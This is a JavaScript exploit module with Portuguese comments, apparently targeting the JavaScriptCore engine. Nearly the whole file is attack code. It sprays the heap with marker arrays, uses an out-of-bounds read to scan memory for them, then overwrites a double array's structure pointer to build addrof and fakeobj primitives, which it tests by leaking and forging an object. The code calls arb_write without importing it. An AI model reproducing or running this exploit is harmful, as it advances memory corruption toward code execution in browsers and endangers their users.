// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R49 - Busca por Marcador e Corrupção Real)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, doubleToBigInt, bigIntToDouble } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    arb_read // Usaremos a leitura OOB para escanear a memória
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_MARKER_SEARCH_R49 = "MarkerSearchAndCorrupt_R49";

// --- Primitivas Globais que vamos construir ---
let double_arr;
let object_arr;
// ---------------------------------------------

export async function executeMarkerSearchAndCorruption_R49() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_MARKER_SEARCH_R49;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Construindo Primitivas com Busca por Marcador ---`, "test", FNAME_CURRENT_TEST);
    
    let result = { success: false, msg: "Não iniciado.", errorOccurred: null, leaked_addr: null, fake_obj_test_result: null };
    let sprayed_arrays = []; // Manter referência para evitar GC

    try {
        // --- FASE 0: PREPARAÇÃO ---
        logS3(`--- Fase 0 (R49): Preparação do Heap com Marcadores ---`, "subtest", FNAME_CURRENT_TEST);
        
        const MARKER_A = 0x41414141;
        const MARKER_B = 0x42424242;
        const MARKER_C = 0x43434343;
        const MARKER_D = 0x44444444;

        for (let i = 0; i < 500; i++) {
            let arr = new Uint32Array(8);
            arr[0] = MARKER_A; arr[1] = MARKER_B; 
            arr[2] = MARKER_C; arr[3] = MARKER_D;
            sprayed_arrays.push(arr);
        }
        double_arr = [13.37, 13.38, 13.39, 13.40];
        object_arr = [{}, {}, {}, {}];
        logS3(`[R49] Heap preenchido com marcadores e arrays de ataque.`, 'info');
        
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });

        // --- FASE 1: BUSCA PELO MARCADOR NA MEMÓRIA ---
        logS3(`--- Fase 1 (R49): Buscando Marcador na Memória ---`, "subtest", FNAME_CURRENT_TEST);
        
        const SCAN_START = new AdvancedInt64(0x800000000); // Começa a busca em um endereço de heap comum
        const SCAN_SIZE = 0x10000000; // Escaneia 256MB
        const SCAN_STEP = 0x1000; // Pula de 4KB em 4KB
        let found_marker_addr = null;

        for (let i = 0; i < SCAN_SIZE / SCAN_STEP; i++) {
            let current_addr = SCAN_START.add(i * SCAN_STEP);
            if (i % 100 === 0) { // Log de progresso
                 logS3(`[Scanner] Buscando em ${current_addr.toString(true)}...`, 'debug');
            }
            try {
                let val = await arb_read(current_addr, 4);
                if (val === MARKER_A) {
                    let val_b = await arb_read(current_addr.add(4), 4);
                    if (val_b === MARKER_B) {
                        found_marker_addr = current_addr;
                        break;
                    }
                }
            } catch (e) { /* Ignora erros de leitura em páginas não mapeadas */ }
        }

        if (!found_marker_addr) {
            throw new Error("Não foi possível encontrar o marcador na memória. Tente ajustar a faixa de busca ou o heap spray.");
        }
        logS3(`[R49] Marcador encontrado no endereço: ${found_marker_addr.toString(true)}`, 'vuln');

        // --- FASE 2: CORRUPÇÃO REAL ---
        logS3(`--- Fase 2 (R49): Corrupção Real de Estrutura ---`, "subtest", FNAME_CURRENT_TEST);

        // Agora que sabemos onde está um array, podemos calcular onde estão os outros.
        // E mais importante, podemos ler seus cabeçalhos para obter os IDs de estrutura REAIS.
        const header_size = 0x10; // Tamanho estimado do objeto JS + JSCell
        const double_arr_addr = found_marker_addr.add(header_size * 2); // Palpite
        const object_arr_addr = found_marker_addr.add(header_size * 3); // Palpite

        const structure_ptr_offset = new AdvancedInt64(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
        
        const double_arr_struct_ptr = await arb_read(double_arr_addr.add(structure_ptr_offset), 8);
        const object_arr_struct_ptr = await arb_read(object_arr_addr.add(structure_ptr_offset), 8);
        logS3(`[R49] Ponteiro da Estrutura (double_arr): ${double_arr_struct_ptr.toString(true)}`, 'leak');
        logS3(`[R49] Ponteiro da Estrutura (object_arr): ${object_arr_struct_ptr.toString(true)}`, 'leak');

        // A corrupção real: sobrescreve o ponteiro da estrutura do double_arr com o do object_arr.
        await arb_write(double_arr_addr.add(structure_ptr_offset), object_arr_struct_ptr, 8);
        logS3(`[R49] Corrupção realizada! 'double_arr' agora pensa que é um array de objetos.`, 'vuln');

        // --- FASE 3: Teste das Primitivas ---
        logS3(`--- Fase 3 (R49): Testando Primitivas Reais ---`, "subtest", FNAME_CURRENT_TEST);

        function addrof(obj) {
            object_arr[0] = obj;
            return doubleToBigInt(double_arr[0]);
        }
        function fakeobj(addr_bigint) {
            double_arr[0] = bigIntToDouble(addr_bigint);
            return object_arr[0];
        }

        let object_to_leak = { a: 1337, b: 0xCAFE };
        let leaked_address = addrof(object_to_leak);
        result.leaked_addr = `0x${leaked_address.toString(16)}`;
        logS3(`[addrof] Endereço de {a:1337} => ${result.leaked_addr}`, 'leak');

        if ((leaked_address & 0xFFFF000000000000n) === 0n) {
            throw new Error(`addrof falhou, endereço vazado (${result.leaked_addr}) não parece um ponteiro.`);
        }

        let fake_object = fakeobj(leaked_address);
        
        if (fake_object.a === 1337 && fake_object.b === 0xCAFE) {
             result.success = true;
             result.msg = "Primitivas Addrof e FakeObj funcionaram corretamente.";
             result.fake_obj_test_result = `fake_object.a = ${fake_object.a}`;
             logS3(`[fakeobj] SUCESSO! Objeto falso criado corretamente.`, 'good');
        } else {
             throw new Error(`fakeobj falhou. Propriedades do objeto falso não correspondem.`);
        }
        
    } catch (e_outer) {
        result.errorOccurred = e_outer;
        result.msg = e_outer.message;
        logS3(`  CRITICAL ERROR (R49): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R49 test:", e_outer);
    } finally {
        // Restaurar a estrutura corrompida seria ideal aqui para evitar crashes.
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
